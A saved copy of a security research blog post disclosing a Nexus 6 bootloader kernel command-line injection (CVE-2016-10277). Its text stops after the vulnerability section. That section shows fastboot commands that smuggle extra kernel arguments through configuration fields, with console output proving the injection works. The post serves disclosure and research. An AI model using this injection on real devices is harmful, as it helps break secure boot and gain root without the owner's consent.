<!DOCTYPE html>
<!-- saved from url=(0114)https://alephsecurity.com/2017/05/23/nexus6-initroot/#anecdote-a-linux-kernel-out-of-bounds-write-cve-2017-1000363 -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<script type="text/javascript" async="" src="./2017 - initroot Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection_files/analytics.js.下載"></script><script async="" src="./2017 - initroot Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection_files/js"></script>
<script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        
        gtag('config', 'UA-92665328-1');
    </script>

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<title>initroot: Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection</title>
<meta name="name" content="initroot: Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection">
<meta name="description" content="Bootloader Kernel Command-line Injection Vulnerability (CVE-2016-10277) in Nexus 6 leads to Secure Boot Bypass">
<meta name="image" content="https://alephsecurity.com/assets/img/logo-black.png">
<meta name="twitter:card" content="summary">
<meta name="twitter:site" content="@alephsecurity">
<meta name="twitter:creator" content="@alephsecurity">
<meta name="twitter:title" content="initroot: Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection">
<meta name="twitter:url" content="https://alephsecurity.com/2017/05/23/nexus6-initroot/">
<meta name="twitter:description" content="Bootloader Kernel Command-line Injection Vulnerability (CVE-2016-10277) in Nexus 6 leads to Secure Boot Bypass">
<meta name="twitter:image:src" content="https://alephsecurity.com/assets/img/logo-black.png">
<meta property="og:site_name" content="">
<meta property="og:title" content="initroot: Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection">
<meta property="og:type" content="article">
<meta property="og:description" content="Bootloader Kernel Command-line Injection Vulnerability (CVE-2016-10277) in Nexus 6 leads to Secure Boot Bypass">
<meta property="og:url" content="https://alephsecurity.com/2017/05/23/nexus6-initroot/">
<meta property="article:published_time" content="2017-05-23T00:00:00+00:00">
<meta property="article:author" content="https://alephsecurity.com">
<meta property="og:image" content="https://alephsecurity.com/assets/img/logo-black.png">
<meta property="article:tag" content="CVE-2016-10277"> <meta property="article:tag" content="kernel"> <meta property="article:tag" content="command"> <meta property="article:tag" content="line"> <meta property="article:tag" content="cmdline"> <meta property="article:tag" content="injection"> <meta property="article:tag" content="bootloader"> <meta property="article:tag" content="vulnerability"> <meta property="article:tag" content="exploit"> <meta property="article:tag" content="root"> <meta property="article:tag" content="ramdisk"> <meta property="article:tag" content="initramfs"> <meta property="article:tag" content="initrd"> <meta property="article:tag" content="CVE-2017-1000363"> <meta property="article:tag" content="nexus"> <meta property="article:tag" content="nexus6">
<link rel="icon" href="https://alephsecurity.com/favicon.png">
<link rel="stylesheet" href="./2017 - initroot Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection_files/css">
<link rel="stylesheet" type="text/css" href="./2017 - initroot Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection_files/main.css">
<link rel="stylesheet" href="./2017 - initroot Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection_files/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
<script src="./2017 - initroot Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection_files/katex.min.js.下載" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
<script type="text/x-mathjax-config;executed=true">
    MathJax.Hub.Config({
      messageStyle: "none",
      tex2jax: {preview: "none"},
      CommonHTML: { linebreaks: { automatic: true } },
      "HTML-CSS": { linebreaks: { automatic: true } },
      SVG: { linebreaks: { automatic: true } }
    });
    </script>
<script src="./2017 - initroot Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection_files/MathJax.js.下載" id="">
    </script>
<script src="./2017 - initroot Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection_files/embed.js(1).下載" data-timestamp="1638484146726"></script><style type="text/css">.MathJax_Hover_Frame {border-radius: .25em; -webkit-border-radius: .25em; -moz-border-radius: .25em; -khtml-border-radius: .25em; box-shadow: 0px 0px 15px #83A; -webkit-box-shadow: 0px 0px 15px #83A; -moz-box-shadow: 0px 0px 15px #83A; -khtml-box-shadow: 0px 0px 15px #83A; border: 1px solid #A6D ! important; display: inline-block; position: absolute}
.MathJax_Menu_Button .MathJax_Hover_Arrow {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 4px; -webkit-border-radius: 4px; -moz-border-radius: 4px; -khtml-border-radius: 4px; font-family: 'Courier New',Courier; font-size: 9px; color: #F0F0F0}
.MathJax_Menu_Button .MathJax_Hover_Arrow span {display: block; background-color: #AAA; border: 1px solid; border-radius: 3px; line-height: 0; padding: 4px}
.MathJax_Hover_Arrow:hover {color: white!important; border: 2px solid #CCC!important}
.MathJax_Hover_Arrow:hover span {background-color: #CCC!important}
</style><style type="text/css">#MathJax_About {position: fixed; left: 50%; width: auto; text-align: center; border: 3px outset; padding: 1em 2em; background-color: #DDDDDD; color: black; cursor: default; font-family: message-box; font-size: 120%; font-style: normal; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; border-radius: 15px; -webkit-border-radius: 15px; -moz-border-radius: 15px; -khtml-border-radius: 15px; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
#MathJax_About.MathJax_MousePost {outline: none}
.MathJax_Menu {position: absolute; background-color: white; color: black; width: auto; padding: 2px; border: 1px solid #CCCCCC; margin: 0; cursor: default; font: menu; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
.MathJax_MenuItem {padding: 2px 2em; background: transparent}
.MathJax_MenuArrow {position: absolute; right: .5em; padding-top: .25em; color: #666666; font-size: .75em}
.MathJax_MenuActive .MathJax_MenuArrow {color: white}
.MathJax_MenuArrow.RTL {left: .5em; right: auto}
.MathJax_MenuCheck {position: absolute; left: .7em}
.MathJax_MenuCheck.RTL {right: .7em; left: auto}
.MathJax_MenuRadioCheck {position: absolute; left: 1em}
.MathJax_MenuRadioCheck.RTL {right: 1em; left: auto}
.MathJax_MenuLabel {padding: 2px 2em 4px 1.33em; font-style: italic}
.MathJax_MenuRule {border-top: 1px solid #CCCCCC; margin: 4px 1px 0px}
.MathJax_MenuDisabled {color: GrayText}
.MathJax_MenuActive {background-color: Highlight; color: HighlightText}
.MathJax_MenuDisabled:focus, .MathJax_MenuLabel:focus {background-color: #E8E8E8}
.MathJax_ContextMenu:focus {outline: none}
.MathJax_ContextMenu .MathJax_MenuItem:focus {outline: none}
#MathJax_AboutClose {top: .2em; right: .2em}
.MathJax_Menu .MathJax_MenuClose {top: -10px; left: -10px}
.MathJax_MenuClose {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; font-family: 'Courier New',Courier; font-size: 24px; color: #F0F0F0}
.MathJax_MenuClose span {display: block; background-color: #AAA; border: 1.5px solid; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; line-height: 0; padding: 8px 0 6px}
.MathJax_MenuClose:hover {color: white!important; border: 2px solid #CCC!important}
.MathJax_MenuClose:hover span {background-color: #CCC!important}
.MathJax_MenuClose:hover:focus {outline: none}
</style><style type="text/css">.MathJax_Preview .MJXf-math {color: inherit!important}
</style><style type="text/css">.MJX_Assistive_MathML {position: absolute!important; top: 0; left: 0; clip: rect(1px, 1px, 1px, 1px); padding: 1px 0 0 0!important; border: 0!important; height: 1px!important; width: 1px!important; overflow: hidden!important; display: block!important; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none}
.MJX_Assistive_MathML.MJX_Assistive_MathML_Block {width: 100%!important}
</style><style type="text/css">#MathJax_Zoom {position: absolute; background-color: #F0F0F0; overflow: auto; display: block; z-index: 301; padding: .5em; border: 1px solid black; margin: 0; font-weight: normal; font-style: normal; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; -webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; box-shadow: 5px 5px 15px #AAAAAA; -webkit-box-shadow: 5px 5px 15px #AAAAAA; -moz-box-shadow: 5px 5px 15px #AAAAAA; -khtml-box-shadow: 5px 5px 15px #AAAAAA; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
#MathJax_ZoomOverlay {position: absolute; left: 0; top: 0; z-index: 300; display: inline-block; width: 100%; height: 100%; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
#MathJax_ZoomFrame {position: relative; display: inline-block; height: 0; width: 0}
#MathJax_ZoomEventTrap {position: absolute; left: 0; top: 0; z-index: 302; display: inline-block; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
</style><style type="text/css">.MathJax_Preview {color: #888}
#MathJax_Message {position: fixed; left: 1em; bottom: 1.5em; background-color: #E6E6E6; border: 1px solid #959595; margin: 0px; padding: 2px 8px; z-index: 102; color: black; font-size: 80%; width: auto; white-space: nowrap}
#MathJax_MSIE_Frame {position: absolute; top: 0; left: 0; width: 0px; z-index: 101; border: 0px; margin: 0px; padding: 0px}
.MathJax_Error {color: #CC0000; font-style: italic}
</style><script src="./2017 - initroot Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection_files/count-data.js.下載"></script><link rel="prefetch" as="style" href="https://c.disquscdn.com/next/embed/styles/lounge.3e33cc45b553fa4f7fd3dfc49dc03ed0.css"><link rel="prefetch" as="script" href="https://c.disquscdn.com/next/embed/common.bundle.2f2f40d40785c9541a90e9086c8770a3.js"><link rel="prefetch" as="script" href="https://c.disquscdn.com/next/embed/lounge.bundle.a1463487bac02a7bb88bedf02c8655b7.js"><link rel="prefetch" as="script" href="https://disqus.com/next/config.js"><style type="text/css">.MJXp-script {font-size: .8em}
.MJXp-right {-webkit-transform-origin: right; -moz-transform-origin: right; -ms-transform-origin: right; -o-transform-origin: right; transform-origin: right}
.MJXp-bold {font-weight: bold}
.MJXp-italic {font-style: italic}
.MJXp-scr {font-family: MathJax_Script,'Times New Roman',Times,STIXGeneral,serif}
.MJXp-frak {font-family: MathJax_Fraktur,'Times New Roman',Times,STIXGeneral,serif}
.MJXp-sf {font-family: MathJax_SansSerif,'Times New Roman',Times,STIXGeneral,serif}
.MJXp-cal {font-family: MathJax_Caligraphic,'Times New Roman',Times,STIXGeneral,serif}
.MJXp-mono {font-family: MathJax_Typewriter,'Times New Roman',Times,STIXGeneral,serif}
.MJXp-largeop {font-size: 150%}
.MJXp-largeop.MJXp-int {vertical-align: -.2em}
.MJXp-math {display: inline-block; line-height: 1.2; text-indent: 0; font-family: 'Times New Roman',Times,STIXGeneral,serif; white-space: nowrap; border-collapse: collapse}
.MJXp-display {display: block; text-align: center; margin: 1em 0}
.MJXp-math span {display: inline-block}
.MJXp-box {display: block!important; text-align: center}
.MJXp-box:after {content: " "}
.MJXp-rule {display: block!important; margin-top: .1em}
.MJXp-char {display: block!important}
.MJXp-mo {margin: 0 .15em}
.MJXp-mfrac {margin: 0 .125em; vertical-align: .25em}
.MJXp-denom {display: inline-table!important; width: 100%}
.MJXp-denom > * {display: table-row!important}
.MJXp-surd {vertical-align: top}
.MJXp-surd > * {display: block!important}
.MJXp-script-box > *  {display: table!important; height: 50%}
.MJXp-script-box > * > * {display: table-cell!important; vertical-align: top}
.MJXp-script-box > *:last-child > * {vertical-align: bottom}
.MJXp-script-box > * > * > * {display: block!important}
.MJXp-mphantom {visibility: hidden}
.MJXp-munderover {display: inline-table!important}
.MJXp-over {display: inline-block!important; text-align: center}
.MJXp-over > * {display: block!important}
.MJXp-munderover > * {display: table-row!important}
.MJXp-mtable {vertical-align: .25em; margin: 0 .125em}
.MJXp-mtable > * {display: inline-table!important; vertical-align: middle}
.MJXp-mtr {display: table-row!important}
.MJXp-mtd {display: table-cell!important; text-align: center; padding: .5em 0 0 .5em}
.MJXp-mtr > .MJXp-mtd:first-child {padding-left: 0}
.MJXp-mtr:first-child > .MJXp-mtd {padding-top: 0}
.MJXp-mlabeledtr {display: table-row!important}
.MJXp-mlabeledtr > .MJXp-mtd:first-child {padding-left: 0}
.MJXp-mlabeledtr:first-child > .MJXp-mtd {padding-top: 0}
.MJXp-merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 1px 3px; font-style: normal; font-size: 90%}
.MJXp-scale0 {-webkit-transform: scaleX(.0); -moz-transform: scaleX(.0); -ms-transform: scaleX(.0); -o-transform: scaleX(.0); transform: scaleX(.0)}
.MJXp-scale1 {-webkit-transform: scaleX(.1); -moz-transform: scaleX(.1); -ms-transform: scaleX(.1); -o-transform: scaleX(.1); transform: scaleX(.1)}
.MJXp-scale2 {-webkit-transform: scaleX(.2); -moz-transform: scaleX(.2); -ms-transform: scaleX(.2); -o-transform: scaleX(.2); transform: scaleX(.2)}
.MJXp-scale3 {-webkit-transform: scaleX(.3); -moz-transform: scaleX(.3); -ms-transform: scaleX(.3); -o-transform: scaleX(.3); transform: scaleX(.3)}
.MJXp-scale4 {-webkit-transform: scaleX(.4); -moz-transform: scaleX(.4); -ms-transform: scaleX(.4); -o-transform: scaleX(.4); transform: scaleX(.4)}
.MJXp-scale5 {-webkit-transform: scaleX(.5); -moz-transform: scaleX(.5); -ms-transform: scaleX(.5); -o-transform: scaleX(.5); transform: scaleX(.5)}
.MJXp-scale6 {-webkit-transform: scaleX(.6); -moz-transform: scaleX(.6); -ms-transform: scaleX(.6); -o-transform: scaleX(.6); transform: scaleX(.6)}
.MJXp-scale7 {-webkit-transform: scaleX(.7); -moz-transform: scaleX(.7); -ms-transform: scaleX(.7); -o-transform: scaleX(.7); transform: scaleX(.7)}
.MJXp-scale8 {-webkit-transform: scaleX(.8); -moz-transform: scaleX(.8); -ms-transform: scaleX(.8); -o-transform: scaleX(.8); transform: scaleX(.8)}
.MJXp-scale9 {-webkit-transform: scaleX(.9); -moz-transform: scaleX(.9); -ms-transform: scaleX(.9); -o-transform: scaleX(.9); transform: scaleX(.9)}
.MathJax_PHTML .noError {vertical-align: ; font-size: 90%; text-align: left; color: black; padding: 1px 3px; border: 1px solid}
</style><script src="./2017 - initroot Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection_files/alfie_v4.63f1ab6d6b9d5807dc0c94ef3fe0b851.js.下載" async="" charset="UTF-8"></script></head>
<body><div id="MathJax_Message" style="display: none;"></div>
<div class="wrapper">
<div class="page__back">
<a href="https://alephsecurity.com/">&lt;-- <span class="smallogo">א</span></a>
</div>
<div class="page">
<div class="page__post">
<div class="page__title">
<h1>initroot: Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection</h1>
</div>
By <a href="https://alephsecurity.com/authors/roeeh">Roee Hay</a> (<a href="https://twitter.com/roeehay">@roeehay</a>)
<br>
<div class="page__date"><span>May 23, 2017</span></div>
* <div class="page__refs"><span>
<br> <div class="cve-critical"><span class="" title="Motorola Android Bootloader Kernel Cmdline Injection Secure Boot Bypass"><a href="https://alephsecurity.com/vulns/aleph-2017011">CVE-2016-10277</a></span></div> <div class="cve-moderate"><span class="" title="Linux lp.c Out-of-Bounds Write via Kernel Command-line"><a href="https://alephsecurity.com/vulns/aleph-2017023">CVE-2017-1000363</a></span></div>
</span></div>
<br>
* <div class="page__commentcount"><span><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#disqus_thread">8 Comments</a></span></div>
<div class="page__content" ?="">
<p>In the <a href="https://source.android.com/security/bulletin/2017-05-01#eop-in-motorola-bootloader">May 2017 Android Security Bulletin</a>, Google released a patch to a critical and unique vulnerability <span class="cve-critical" title="Motorola Android Bootloader Kernel Cmdline Injection Secure Boot Bypass"><a href="https://alephsecurity.com/vulns/aleph-2017011">CVE-2016-10277</a></span> in the Nexus 6 Motorola bootloader we had found and responsibly disclosed. It should be noted that although we only verified this issue on Nexus 6, it could potentially affect other Motorola devices as well.</p>
<p>By exploiting the vulnerability, a physical adversary or one with authorized-<code class="language-plaintext highlighter-rouge">ADB</code>/<code class="language-plaintext highlighter-rouge">fastboot</code> USB access to the (<strong>bootloader-locked</strong>) device (such as PC malware awaiting for an <code class="language-plaintext highlighter-rouge">ADB</code>-authorized developer’s device to be hooked via USB) could <strong>break the Secure/Verified Boot</strong> mechanism, allowing him to gain <strong>unrestricted root privileges</strong>, and completely own the user space (<a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#beyond-initramfs-firmware-injection">which may also lead much more</a>), by loading a tampered or malicious <code class="language-plaintext highlighter-rouge">initramfs</code> image. Moreover, exploitation does not lead to a factory reset hence user data remains intact (and still encrypted). It should be noted that we do not demonstrate an untethered attack.</p>
<p>During this research we also <a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#anecdote-a-linux-kernel-out-of-bounds-write-cve-2017-1000363">uncovered</a> a 18-year-old Linux Kernel bug (not affecting Nexus 6 and probably does not affect any Android device): <span class="cve-moderate" title="Linux lp.c Out-of-Bounds Write via Kernel Command-line"><a href="https://alephsecurity.com/vulns/aleph-2017023">CVE-2017-1000363</a></span></p>
<p>Before we begin, here is a video demo of the <a href="https://github.com/alephsecurity/initroot">PoC exploit</a>:</p>
<div class="movie"><iframe width="560" height="315" src="./2017 - initroot Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection_files/dijRMpv4ktM.html" frameborder="0" allowfullscreen=""></iframe></div>
<h2 id="table-of-contents">Table of Contents</h2>
<ol>
<li><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#preface">Preface</a></li>
<li><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#vulnerability-kernel-command-line-injection-cve-2016-10277">Vulnerability: Kernel Command-Line Injection (CVE-2016-10277)</a></li>
<li><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#immediate-result-bypassing-cve-2016-8467s-patch">Immediate Result: Bypassing CVE-2016-8467’s Patch</a></li>
<li><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#a-whole-new-attack-surface">A Whole New Attack Surface</a></li>
<li><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#secure-boot-in-nexus-6">Secure Boot in Nexus 6</a></li>
<li><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#linux-kernel-initialization-from-aboot-to-init-in-a-nutshell">Linux Kernel Initialization: From ABOOT to init in a Nutshell</a></li>
<li><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#initializing-userspace--dm-verity">Initializing userspace &amp; dm-verity</a></li>
<li><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#failed-attempt-controlling-ramdisk_execute_command">Failed Attempt: Controlling ramdisk_execute_command</a></li>
<li><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#controlling-the-initramfs-physical-loading-address">Controlling the initramfs Physical Loading Address</a>.</li>
<li><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#loading-arbitrary-data-to-memory-through-usb">Loading Arbitrary Data to Memory Through USB</a></li>
<li><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#creating-a-malicious-initramfs">Creating a Malicious initramfs</a></li>
<li><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#putting-it-all-together-got-root">Putting it All Together: got root!</a></li>
<li><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#beyond-initramfs-firmware-injection">Beyond initramfs: Firmware Injection</a></li>
<li><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#googles-patch">Google’s Patch</a></li>
<li><a href="https://alephsecurity.com/2017/05/23/nexus6-initroot/#anecdote-a-linux-kernel-out-of-bounds-write-cve-2017-1000363">Anecdote: Linux Kernel Out-of-Bounds Write (CVE-2017-1000363)</a></li>
</ol>
<h2 id="preface">Preface</h2>
<p>In January 2017 we <a href="https://alephsecurity.com/2017/01/05/attacking-android-custom-bootmodes/">disclosed</a> a high severity vulnerability, <span class="cve-high" title="Google Nexus 6/6P Custom Boot Modes USB Configs Override"><a href="https://alephsecurity.com/vulns/aleph-2016002">CVE-2016-8467</a></span>, affecting Nexus 6/6P, that allowed attackers to change the bootmode of the device, giving access to hidden USB interfaces. This was done through a <code class="language-plaintext highlighter-rouge">fastboot</code> command, such as <code class="language-plaintext highlighter-rouge">fastboot oem config bootmode bp-tools</code> which caused the bootloader to change the <code class="language-plaintext highlighter-rouge">androidboot.mode</code> argument in the kernel command line. Google has fixed the issue by hardening the bootloader – a locked bootloader no longer allowed booting with a custom bootmode.</p>
<p>Just before Google released the patch, we had discovered way to bypass it on Nexus 6.</p>
<h2 id="vulnerability-kernel-command-line-injection-cve-2016-10277">Vulnerability: Kernel Command-line Injection (CVE-2016-10277)</h2>
<p>Nexus 6’s bootloader contains several arguments that can be controlled through the <code class="language-plaintext highlighter-rouge">fastboot</code> interface, even if the bootloader is locked:</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ fastboot oem config
[...]
(bootloader) <span class="nt">&lt;UTAG</span> <span class="na">name=</span><span class="s">"battery"</span> <span class="na">protected=</span><span class="s">"false"</span><span class="nt">&gt;</span>
(bootloader)   <span class="nt">&lt;value&gt;</span>
(bootloader)   <span class="nt">&lt;/value&gt;</span>
(bootloader)   <span class="nt">&lt;description&gt;</span>
(bootloader)     Battery detection control
(bootloader)     ("meter_lock" or "no_eprom")
(bootloader)   <span class="nt">&lt;/description&gt;</span>
(bootloader) <span class="nt">&lt;/UTAG&gt;</span>

(bootloader) <span class="nt">&lt;UTAG</span> <span class="na">name=</span><span class="s">"bootmode"</span> <span class="na">protected=</span><span class="s">"false"</span><span class="nt">&gt;</span>
(bootloader)   <span class="nt">&lt;value&gt;</span>
(bootloader)   <span class="nt">&lt;/value&gt;</span>
(bootloader)   <span class="nt">&lt;description&gt;</span>
(bootloader)     To force certain bootmode
(bootloader)     (valid values are "fastboot", "factory", "bp-tools", "q
(bootloader)     com", and "on-device-diag")
(bootloader)   <span class="nt">&lt;/description&gt;</span>
(bootloader) <span class="nt">&lt;/UTAG&gt;</span>

(bootloader) <span class="nt">&lt;UTAG</span> <span class="na">name=</span><span class="s">"carrier"</span> <span class="na">protected=</span><span class="s">"false"</span><span class="nt">&gt;</span>
(bootloader)   <span class="nt">&lt;value&gt;</span>
(bootloader)   <span class="nt">&lt;/value&gt;</span>
(bootloader)   <span class="nt">&lt;description&gt;</span>
(bootloader)     Carrier IDs, see <a class="vglnk" href="http://goo.gl/lojLh3" rel="nofollow"><span>http</span><span>://</span><span>goo</span><span>.</span><span>gl</span><span>/</span><span>lojLh3</span></a>
(bootloader)   <span class="nt">&lt;/description&gt;</span>
(bootloader) <span class="nt">&lt;/UTAG&gt;</span>

(bootloader) <span class="nt">&lt;UTAG</span> <span class="na">name=</span><span class="s">"console"</span> <span class="na">type=</span><span class="s">"str"</span> <span class="na">protected=</span><span class="s">"false"</span><span class="nt">&gt;</span>
(bootloader)   <span class="nt">&lt;value&gt;</span>
(bootloader)   <span class="nt">&lt;/value&gt;</span>
(bootloader)   <span class="nt">&lt;description&gt;</span>
(bootloader)     Config kernel console log
(bootloader)       enable|true     - enable with default settings
(bootloader)       disable|false   - disable
(bootloader)       <span class="nt">&lt;config</span> <span class="err">string</span><span class="nt">&gt;</span> - enable with customized settings
(bootloader)       (e.g.: "ttyHSL0", "ttyHSL0,230400,n8")
(bootloader)   <span class="nt">&lt;/description&gt;</span>
(bootloader) <span class="nt">&lt;/UTAG&gt;</span>

(bootloader) <span class="nt">&lt;UTAG</span> <span class="na">name=</span><span class="s">"fsg-id"</span> <span class="na">type=</span><span class="s">"str"</span> <span class="na">protected=</span><span class="s">"false"</span><span class="nt">&gt;</span>
(bootloader)   <span class="nt">&lt;value&gt;</span>
(bootloader)   <span class="nt">&lt;/value&gt;</span>
(bootloader)   <span class="nt">&lt;description&gt;</span>
(bootloader)     FSG IDs, see <a class="vglnk" href="http://goo.gl/gPmhU" rel="nofollow"><span>http</span><span>://</span><span>goo</span><span>.</span><span>gl</span><span>/</span><span>gPmhU</span></a>
(bootloader)   <span class="nt">&lt;/description&gt;</span>
(bootloader) <span class="nt">&lt;/UTAG&gt;</span>

OKAY [  0.048s]
finished. total time: 0.048s
</code></pre></div></div>
<p>The <code class="language-plaintext highlighter-rouge">fsg-id</code>, <code class="language-plaintext highlighter-rouge">carrier</code> and <code class="language-plaintext highlighter-rouge">console</code> parameters can contain arbitrary values (although with a restricted size), which eventually propagate to the kernel command line.
One can prove that by issuing the following commands:</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>fastboot oem config console foo
<span class="gp">$</span><span class="w"> </span>fastboot oem config fsg-id bar
<span class="gp">$</span><span class="w"> </span>fastboot oem config carrier baz
</code></pre></div></div>
<p>And then check the kernel command line:</p>
<div class="language-terminal highlighter-rouge"><pre class="highlight"><code>shamu:/ $ dmesg | grep command
[    0.000000] Kernel command line: <span class="kv">console</span>=<span class="nc">foo</span>,115200,n8 earlyprintk 
<span class="kv">androidboot.console</span>=<span class="nc">foo</span> androidboot.hardware=shamu msm_rtb.filter=0x37
ehci-hcd.park=3 utags.blkdev=/dev/block/platform/msm_sdcc.1/by-name/utags
utags.backup=/dev/block/platform/msm_sdcc.1/by-name/utagsBackup coherent_pool=8M
vmalloc=300M buildvariant=user androidboot.bootdevice=msm_sdcc.1 androidboot.serialno=ZX1G427V97
androidboot.baseband=mdm androidboot.version-baseband=D4.01-9625-05.45+FSG-9625-02.117
androidboot.mode=normal androidboot.device=shamu androidboot.hwrev=0x83A0
androidboot.radio=0x7 androidboot.powerup_reason=0x00004000 androidboot.bootreason=reboot
androidboot.write_protect=0 restart.download_mode=0 <span class="kv">androidboot.fsg-id</span>=<span class="nc">bar</span>
androidboot.secure_hardware=1 androidboot.cid=0xDE androidboot.wifimacaddr=F8:CF:C5:9F:8F:EB
androidboot.btmacaddr=F8:CF:C5:9F:8F:EA mdss_mdp.panel=1:dsi:0:qcom,mdss_dsi_mot_smd_596_QHD_dualmipi0_cmd_v0
androidboot.bootloader=moto-apq8084-72.02 <span class="kv">androidboot.carrier</span>=<span class="nc">baz</span> androidboot.hard&lt;
</code></pre>
</div>
<p>Now, if the bootloader didn’t sanitize those arguments, then we could pass arbitrary kernel command line arguments:</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>fastboot oem config console <span class="s2">"a androidboot.foo=0 "</span>
<span class="gp">$</span><span class="w"> </span>fastboot oem config fsg-id <span class="s2">"a androidboot.bar=1"</span>
<span class="gp">$</span><span class="w"> </span>fastboot oem config carrier <span class="s2">"a androidboot.baz=2"</span>
</code></pre></div></div>
<p>And indeed:</p>
<div class="language-terminal highlighter-rouge"><pre class="highlight"><code>shamu:/ $ dmesg | grep command
[    0.000000] Kernel command line: <span class="kv">console</span>=<span class="nc">a androidboot.foo=0 </span>,115200,n8 earlyprintk 
<span class="kv">androidboot.console</span>=<span class="nc">a androidboot.foo=0 </span> androidboot.hardware=shamu msm_rtb.filter=0x37
ehci-hcd.park=3 utags.blkdev=/dev/block/platform/msm_sdcc.1/by-name/utags
utags.backup=/dev/block/platform/msm_sdcc.1/by-name/utagsBackup coherent_pool=8M
vmalloc=300M buildvariant=user androidboot.bootdevice=msm_sdcc.1 androidboot.serialno=ZX1G427V97
androidboot.baseband=mdm androidboot.version-baseband=D4.01-9625-05.45+FSG-9625-02.117
androidboot.mode=normal androidboot.device=shamu androidboot.hwrev=0x83A0
androidboot.radio=0x7 androidboot.powerup_reason=0x00004000 androidboot.bootreason=reboot
androidboot.write_protect=0 restart.download_mode=0 <span class="kv">androidboot.fsg-id</span>=<span class="nc">a androidboot.bar=1</span>
androidboot.secure_hardware=1 androidboot.cid=0xDE androidboot.wifimacaddr=F8:CF:C5:9F:8F:EB
androidboot.btmacaddr=F8:CF:C5:9F:8F:EA mdss_mdp.panel=1:dsi:0:qcom,mdss_dsi_mot_smd_596_QHD_dualmipi0_cmd_v0
androidboot.bootloader=moto-apq8084-72.02 <span class="kv">androidboot.carrier</span>=<span class="nc">a androidboot.baz=2</span> androidboot.hard&lt;
</code></pre>
</div>
<p>As one can see, we’ve managed to set arbitrary <code class="language-plaintext highlighter-rouge">ro.boot</code> properties:</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">shamu:/ $</span><span class="w"> </span>getprop ro.boot.foo
<span class="go">0
</span><span class="gp">shamu:/ $</span><span class="w"> </span>getprop ro.boot.bar
<span class="go">1
</span><span class="gp">shamu:/ $</span><span class="w"> </span>getprop ro.boot.baz
<span class="go">2
</span><span class="gp">shamu:/ $</span><span class="w">
</span></code></pre></div></div>
